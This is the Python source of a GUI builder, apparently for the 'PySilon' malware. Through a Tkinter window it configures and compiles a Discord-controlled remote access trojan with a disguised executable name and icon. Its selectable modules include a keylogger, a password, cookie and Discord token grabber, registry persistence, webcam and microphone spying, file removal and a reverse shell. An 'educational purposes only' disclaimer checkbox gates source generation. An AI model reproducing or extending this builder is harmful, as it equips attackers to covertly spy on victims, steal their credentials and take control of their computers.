from tkinter import *
from tkinter import filedialog
from PIL import ImageTk, Image
import configparser
import compiler
import sys

window_icon = 'resources/icons/icon.ico'; Image.open('resources/icons/icon.ico').resize((120, 120)).save('icon.png', format='PNG')
config_path, status = 'configuration.ini', 'configuration'
config = configparser.ConfigParser()
config['SETTINGS'], config['FUNCTIONALITY'] = {}, {}

filenames = {
    'keylogr': 'keylogger.py',
    'scrnsht': 'screenshot.py',
    'regstry': 'registry.py',
    'f_downl': 'file_downloading.py',
    'f_upldg': 'file_uploading.py',
    'f_rmval': 'file_removal.py',
    'f_explr': 'file_explorer.py',
    'grabber': 'grabber.py',
    'mc_live': 'live_microphone.py',
    'mc_recc': 'microphone_recording.py',
    'process': 'process.py',
    'rev_shl': 'reverse_shell.py',
    'webcam_': 'webcam.py'
}

default_modules = [
    'from urllib.request import urlopen\n'
    'from itertools import islice\n',
    'from resources.misc import *\n',
    'import subprocess\n',
    'import discord\n',
    'import asyncio\n',
    'import sys\n',
    'import os\n',
]

source_code_modifiers = {
    '$modules': [],
    '!opus_initialization': [],
    '!registry': [],
    '!recording_startup': [],
    '!cookies_submit': [],
    '!registry_implosion': [],
    'on reaction add': [],
    'on message': [],
    'on message end': [],
    'anywhere': [],
    'bottom': []
}

def get_file_path(file_types):
    root2 = Tk()
    root2.withdraw()
    root2.attributes('-topmost', True)
    open_dir = filedialog.askopenfilename(filetypes=file_types)
    root2.destroy()
    return open_dir

def load_configuration(is_custom):
    global config, config_path
    config = configparser.ConfigParser()
    if is_custom:
        config_file = get_file_path([('Configuration files', '.ini')])
        config.read(config_file)
        config_path = config_file
    else:
        config.read('configuration.ini')
        config_path = 'configuration.ini'

    server_id.delete(0, END); server_id.insert(0, config['SETTINGS']['server_id'])
    bot_token_1.delete(0, END); bot_token_1.insert(0, config['SETTINGS']['bot_token_1'])
    bot_token_2.delete(0, END); bot_token_2.insert(0, config['SETTINGS']['bot_token_2'])
    bot_token_3.delete(0, END); bot_token_3.insert(0, config['SETTINGS']['bot_token_3'])
    registry_name.delete(0, END); registry_name.insert(0, config['SETTINGS']['registry_name'])
    directory_name.delete(0, END); directory_name.insert(0, config['SETTINGS']['directory_name'])
    executable_name.delete(0, END); executable_name.insert(0, config['SETTINGS']['executable_name'])
    change_icon(config['SETTINGS']['icon_path'])

    cbvar_keylogger.set(config['FUNCTIONALITY']['keylogr'])
    cbvar_screenshot.set(config['FUNCTIONALITY']['scrnsht'])
    cbvar_registry.set(config['FUNCTIONALITY']['regstry'])
    cbvar_file_downloading.set(config['FUNCTIONALITY']['f_downl'])
    cbvar_file_uploading.set(config['FUNCTIONALITY']['f_upldg'])
    cbvar_file_removal.set(config['FUNCTIONALITY']['f_rmval'])
    cbvar_file_explorer.set(config['FUNCTIONALITY']['f_explr'])
    cbvar_grabber.set(config['FUNCTIONALITY']['grabber'])
    cbvar_live_microphone.set(config['FUNCTIONALITY']['mc_live'])
    cbvar_microphone_recording.set(config['FUNCTIONALITY']['mc_recc'])
    cbvar_processes.set(config['FUNCTIONALITY']['process'])
    cbvar_reverse_shell.set(config['FUNCTIONALITY']['rev_shl'])
    cbvar_webcam.set(config['FUNCTIONALITY']['webcam_'])

def reset_configuration():
    server_id.delete(0, END)
    bot_token_1.delete(0, END)
    bot_token_2.delete(0, END)
    bot_token_3.delete(0, END)
    registry_name.delete(0, END)
    directory_name.delete(0, END)
    executable_name.delete(0, END)

    cbvar_keylogger.set(True)
    cbvar_screenshot.set(True)
    cbvar_registry.set(True)
    cbvar_file_downloading.set(True)
    cbvar_file_uploading.set(True)
    cbvar_file_removal.set(True)
    cbvar_file_explorer.set(True)
    cbvar_grabber.set(True)
    cbvar_live_microphone.set(True)
    cbvar_microphone_recording.set(True)
    cbvar_processes.set(True)
    cbvar_reverse_shell.set(True)
    cbvar_webcam.set(True)
    cbvar_disclaimer.set(False)

    change_icon('resources/icons/icon.ico')
    generate_source_btn['state'] = DISABLED
    generate_source_btn['text'] = 'Generate source'
    compile_btn['state'] = DISABLED

def save_configuration():
    global config, window_icon, config_path
    config = configparser.ConfigParser()
    config['SETTINGS'], config['FUNCTIONALITY'] = {}, {}

    config['SETTINGS'], config['FUNCTIONALITY'] = {}, {}
    config['SETTINGS']['server_id'] = server_id.get()
    config['SETTINGS']['bot_token_1'] = bot_token_1.get()
    config['SETTINGS']['bot_token_2'] = bot_token_2.get()
    config['SETTINGS']['bot_token_3'] = bot_token_3.get()
    config['SETTINGS']['registry_name'] = registry_name.get()
    config['SETTINGS']['directory_name'] = directory_name.get()
    config['SETTINGS']['executable_name'] = executable_name.get()
    config['SETTINGS']['spam_channel'] = str(cbvar_keylogger.get())
    config['SETTINGS']['file-related_channel'] = ('True' if (cbvar_file_explorer.get() or cbvar_file_downloading.get() or cbvar_file_uploading.get() or cbvar_file_removal.get()) else 'False')
    config['SETTINGS']['recordings_channel'] = str(cbvar_microphone_recording.get())
    config['SETTINGS']['voice_channel'] = str(cbvar_live_microphone.get())
    config['SETTINGS']['icon_path'] = window_icon

    config['FUNCTIONALITY']['keylogr'] = str(cbvar_keylogger.get())
    config['FUNCTIONALITY']['scrnsht'] = str(cbvar_screenshot.get())
    config['FUNCTIONALITY']['regstry'] = str(cbvar_registry.get())
    config['FUNCTIONALITY']['f_downl'] = str(cbvar_file_downloading.get())
    config['FUNCTIONALITY']['f_upldg'] = str(cbvar_file_uploading.get())
    config['FUNCTIONALITY']['f_rmval'] = str(cbvar_file_removal.get())
    config['FUNCTIONALITY']['f_explr'] = str(cbvar_file_explorer.get())
    config['FUNCTIONALITY']['grabber'] = str(cbvar_grabber.get())
    config['FUNCTIONALITY']['mc_live'] = str(cbvar_live_microphone.get())
    config['FUNCTIONALITY']['mc_recc'] = str(cbvar_microphone_recording.get())
    config['FUNCTIONALITY']['process'] = str(cbvar_processes.get())
    config['FUNCTIONALITY']['rev_shl'] = str(cbvar_reverse_shell.get())
    config['FUNCTIONALITY']['webcam_'] = str(cbvar_webcam.get())

    with open(config_path, 'w') as configfile:
        config.write(configfile)

def disclaimer_toggle():
    if cbvar_disclaimer.get():
        generate_source_btn['state'] = NORMAL
    else:
        config_modification()
        generate_source_btn['state'] = DISABLED

def assemble_source_code():
    global status, config_path
    save_configuration()
    config = configparser.ConfigParser(); config.read(config_path)

    for individual_functionality in config['FUNCTIONALITY'].keys():
        if config['FUNCTIONALITY'][individual_functionality] == 'True':
            with open('resources/source_code/' + filenames[individual_functionality], 'r', encoding='utf-8') as copy_function:
                expectation = '$modules'
                for line in copy_function.readlines():
                    if line == '# end of imports\n':
                        expectation = '?'

                    elif line.replace('# ', '', 1)[:-1] in list(source_code_modifiers.keys()):
                        expectation = line.replace('# ', '', 1)[:-1]

                    elif expectation != '?':
                        source_code_modifiers[expectation].append(line)

                        
    modules_unique = []
    for module in source_code_modifiers['$modules']:
        if module not in modules_unique and module not in default_modules:
            modules_unique.append(module)
    source_code_modifiers['$modules'] = modules_unique

    with open('source.py', 'r', encoding='utf-8') as source_template:
        with open('source_assembled.py', 'w', encoding='utf-8') as source_assembled:
            for base_line in source_template.readlines():
                if base_line[:16] == '# [pysilon_var] ':
                    variable_intendation = int(base_line[-2])
                    variable_name = base_line.replace('# [pysilon_var] ', '', 1)[:-3]
                    if len(source_code_modifiers[variable_name]) > 0:
                        source_assembled.write('    '*variable_intendation + ('    '*variable_intendation).join(source_code_modifiers[variable_name]))
                    else: source_assembled.write('\n')
                    if base_line == '# [pysilon_var] bottom 0\n' and config['FUNCTIONALITY']['keylogr'] == 'False':
                        source_assembled.write('for token in bot_tokens:\n    try:\n        client.run(token)\n    except: pass')
                else:
                    source_assembled.write(base_line)
    
    generate_source_btn['state'] = DISABLED
    generate_source_btn['text'] = 'Source generated'
    if status != 'compiled': compile_btn['state'] = NORMAL
    status = 'assembled'

def change_icon(path=False):
    global icon_photo, config, window_icon
    if not path:
        new_icon = get_file_path([('Image files', '.jpg .png .ico')])
        if new_icon == '': return
    else: new_icon = path
    window_icon = new_icon
    Image.open(new_icon).resize((120, 120)).save('icon.png', format='PNG')
    icon_photo = PhotoImage(file='icon.png')
    icon_btn['image'] = icon_photo
    config['SETTINGS']['icon_path'] = new_icon
    config_modification()

def compile_source():
    global status
    custom_imports = configparser.ConfigParser()
    custom_imports.read('resources/custom_imports.ini')
    with open('custom_imports.txt', 'w') as imports_file:
        imports_file.write('pynacl\n')
        for functionality in config['FUNCTIONALITY'].keys():
            if config['FUNCTIONALITY'][functionality] == 'True':
                for custom_import in custom_imports[functionality].keys():
                    if custom_import != 'nothing_special':
                        imports_file.write(custom_imports[functionality][custom_import] + '\n')
        for general_packages in custom_imports['general'].keys():
            imports_file.write(custom_imports['general'][general_packages] + '\n')

    response = compiler.compile()
    compile_btn['state'] = DISABLED
    status = 'compiled'

def config_modification(var=None, index=None, mode=None):
    global status
    if status == 'assembled':
        status = 'configuration'
        generate_source_btn['state'] = NORMAL
        generate_source_btn['text'] = 'Generate source'
        compile_btn['state'] = DISABLED

if len(sys.argv) > 1:
    if sys.argv[1] == '--cli':
        cli = 'soon' # CLI mode will be added soon...
else:
    root = Tk()
    root.geometry('700x600')
    root.resizable(False, False)
    root.iconbitmap('resources/icons/icon.ico')
    root.title('PySilon builder')

    my_canvas = Canvas(root, width=1, height=1, bd=0)
    Button(my_canvas, text='Load configuration', command=lambda:load_configuration(False)).grid(row=1, column=1, padx=(10, 0), pady=10)
    Button(my_canvas, text='Load custom...', command=lambda:load_configuration(True)).grid(row=1, column=2, padx=(10, 0), pady=10)
    Button(my_canvas, text='Reset', command=reset_configuration).grid(row=1, column=3, padx=(10, 0), pady=10)
    Button(my_canvas, text='Save', command=save_configuration).grid(row=1, column=4, padx=(10, 0), pady=10)
    my_canvas.pack(anchor=NW)

    settings_canvas = Canvas(root, width=1, height=1, bd=0)
    Label(settings_canvas, text='General settings:', justify=RIGHT, anchor=E).grid(row=2, padx=(30, 5), pady=(30, 2), sticky=E)
    Label(settings_canvas, text='Server ID*:', justify=RIGHT, anchor=E).grid(row=3, padx=(30, 5), pady=2, sticky=E)
    Label(settings_canvas, text='BOT Token*:', justify=RIGHT, anchor=E).grid(row=4, padx=(30, 5), pady=2, sticky=E)
    Label(settings_canvas, text='Emergency Token 1:', justify=RIGHT, anchor=E).grid(row=5, padx=(30, 5), pady=2, sticky=E)
    Label(settings_canvas, text='Emergency Token 2:', justify=RIGHT, anchor=E).grid(row=6, padx=(30, 5), pady=2, sticky=E)
    Label(settings_canvas, text='Registry Name*:', justify=RIGHT, anchor=E).grid(row=7, padx=(30, 5), pady=2, sticky=E)
    Label(settings_canvas, text='Directory Name*:', justify=RIGHT, anchor=E).grid(row=8, padx=(30, 5), pady=2, sticky=E)
    Label(settings_canvas, text='Executable name*:', justify=RIGHT, anchor=E).grid(row=9, padx=(30, 5), pady=2, sticky=E)
    Label(settings_canvas, text='Icon*:', justify=RIGHT, anchor=E).grid(row=10, padx=(30, 5), pady=2, sticky=E)
    
    icon_photo = PhotoImage(file='icon.png')
    icon_btn = Button(settings_canvas, image=icon_photo, state=NORMAL, width=120, height=120, command=change_icon)
    icon_btn.grid(row=10, column=1, pady=2, sticky=NW, rowspan=6)

    var_server_id = StringVar()
    var_bot_token_1 = StringVar()
    var_bot_token_2 = StringVar()
    var_bot_token_3 = StringVar()
    var_registry_name = StringVar()
    var_directory_name = StringVar()
    var_executable_name = StringVar()
    server_id = Entry(settings_canvas, textvariable=var_server_id)
    bot_token_1 = Entry(settings_canvas, textvariable=var_bot_token_1)
    bot_token_2 = Entry(settings_canvas, textvariable=var_bot_token_2)
    bot_token_3 = Entry(settings_canvas, textvariable=var_bot_token_3)
    registry_name = Entry(settings_canvas, textvariable=var_registry_name)
    directory_name = Entry(settings_canvas, textvariable=var_directory_name)
    executable_name = Entry(settings_canvas, textvariable=var_executable_name)

    var_server_id.trace_add("write", config_modification)
    var_bot_token_1.trace_add("write", config_modification)
    var_bot_token_2.trace_add("write", config_modification)
    var_bot_token_3.trace_add("write", config_modification)
    var_registry_name.trace_add("write", config_modification)
    var_directory_name.trace_add("write", config_modification)
    var_executable_name.trace_add("write", config_modification)
    server_id.grid(row=3, column=1)
    bot_token_1.grid(row=4, column=1)
    bot_token_2.grid(row=5, column=1)
    bot_token_3.grid(row=6, column=1)
    registry_name.grid(row=7, column=1)
    directory_name.grid(row=8, column=1)
    executable_name.grid(row=9, column=1)
    settings_canvas.pack(anchor=NW, fill=X)

    Label(settings_canvas, text='Malware functionality:', justify=LEFT, anchor=W).grid(row=2, column=2, padx=(30, 0), pady=(30, 0), sticky=W)

    cbvar_keylogger = BooleanVar(value=True)
    cbvar_screenshot = BooleanVar(value=True)
    cbvar_registry = BooleanVar(value=True)
    cbvar_file_downloading = BooleanVar(value=True)
    cbvar_file_uploading = BooleanVar(value=True)
    cbvar_file_removal = BooleanVar(value=True)
    cbvar_file_explorer = BooleanVar(value=True)
    cbvar_grabber = BooleanVar(value=True)
    cbvar_live_microphone = BooleanVar(value=True)
    cbvar_microphone_recording = BooleanVar(value=True)
    cbvar_processes = BooleanVar(value=True)
    cbvar_reverse_shell = BooleanVar(value=True)
    cbvar_webcam = BooleanVar(value=True)

    cb_keylogger = Checkbutton(settings_canvas, text='keylogger', variable=cbvar_keylogger, command=config_modification, onvalue=True, offvalue=False)
    cb_screenshot = Checkbutton(settings_canvas, text='screenshots', variable=cbvar_screenshot, command=config_modification, onvalue=True, offvalue=False)
    cb_registry = Checkbutton(settings_canvas, text='registry injection (start malware every reboot)', variable=cbvar_registry, command=config_modification, onvalue=True, offvalue=False)
    cb_file_downloading = Checkbutton(settings_canvas, text='file downloading', variable=cbvar_file_downloading, command=config_modification, onvalue=True, offvalue=False)
    cb_file_uploading = Checkbutton(settings_canvas, text='file uploading', variable=cbvar_file_uploading, command=config_modification, onvalue=True, offvalue=False)
    cb_file_removal = Checkbutton(settings_canvas, text='file removal', variable=cbvar_file_removal, command=config_modification, onvalue=True, offvalue=False)
    cb_file_explorer = Checkbutton(settings_canvas, text='file exploring', variable=cbvar_file_explorer, command=config_modification, onvalue=True, offvalue=False)
    cb_grabber = Checkbutton(settings_canvas, text='grabber (WiFi, saved passwords, browser history, cookies, Discord)', variable=cbvar_grabber, command=config_modification, onvalue=True, offvalue=False)
    cb_live_microphone = Checkbutton(settings_canvas, text='live microphone (BOT joins voice-channel and plays live mic input)', variable=cbvar_live_microphone, command=config_modification, onvalue=True, offvalue=False)
    cb_microphone_recording = Checkbutton(settings_canvas, text='24/7 microphone recording (.wav files sent on channel)', variable=cbvar_microphone_recording, command=config_modification, onvalue=True, offvalue=False)
    cb_processes = Checkbutton(settings_canvas, text='processes (show list of running processes, kill them)', variable=cbvar_processes, command=config_modification, onvalue=True, offvalue=False)
    cb_reverse_shell = Checkbutton(settings_canvas, text='reverse shell (execute remote CMD commands)', variable=cbvar_reverse_shell, command=config_modification, onvalue=True, offvalue=False)
    cb_webcam = Checkbutton(settings_canvas, text='webcam images capturing', variable=cbvar_webcam, command=config_modification, onvalue=True, offvalue=False)

    cb_keylogger.grid(row=3, column=2, sticky=W, padx=(30, 0))
    cb_screenshot.grid(row=4, column=2, sticky=W, padx=(30, 0))
    cb_registry.grid(row=5, column=2, sticky=W, padx=(30, 0))
    cb_file_downloading.grid(row=6, column=2, sticky=W, padx=(30, 0))
    cb_file_uploading.grid(row=7, column=2, sticky=W, padx=(30, 0))
    cb_file_removal.grid(row=8, column=2, sticky=W, padx=(30, 0))
    cb_file_explorer.grid(row=9, column=2, sticky=W, padx=(30, 0))
    cb_grabber.grid(row=10, column=2, sticky=W, padx=(30, 0))
    cb_live_microphone.grid(row=11, column=2, sticky=W, padx=(30, 0))
    cb_microphone_recording.grid(row=12, column=2, sticky=W, padx=(30, 0))
    cb_processes.grid(row=14, column=2, sticky=W, padx=(30, 0))
    cb_reverse_shell.grid(row=15, column=2, sticky=W, padx=(30, 0))
    cb_webcam.grid(row=16, column=2, sticky=W, padx=(30, 0), pady=(0, 30))

    bottom_buttons = Canvas(root, width=1, height=1, bd=0)
    cbvar_disclaimer = BooleanVar(value=False)
    cb_disclaimer = Checkbutton(bottom_buttons, text='  I\'m aware that this malware has been made for educational purposes only, and the creator is no way responsible\n  for any direct or indirect damage caused due to the misusage of the information. Everything I do, I\'m doing at\n  my own risk and responsibility.', variable=cbvar_disclaimer, command=disclaimer_toggle, onvalue=True, offvalue=False, justify=LEFT, anchor=W)
    cb_disclaimer.grid(row=1)
    bottom_buttons.pack(pady=(20, 0))

    bottom_buttons = Canvas(root, width=1, height=1, bd=0)
    generate_source_btn = Button(bottom_buttons, text='Generate source', state=DISABLED, command=assemble_source_code)
    generate_source_btn.grid(row=1, column=1, padx=(10, 0), pady=10)
    compile_btn = Button(bottom_buttons, text='Compile', state=DISABLED, command=compile_source)
    compile_btn.grid(row=1, column=2, padx=10, pady=10)
    bottom_buttons.pack(anchor=E, side='bottom')

    server_id.focus_set()
    root.mainloop()
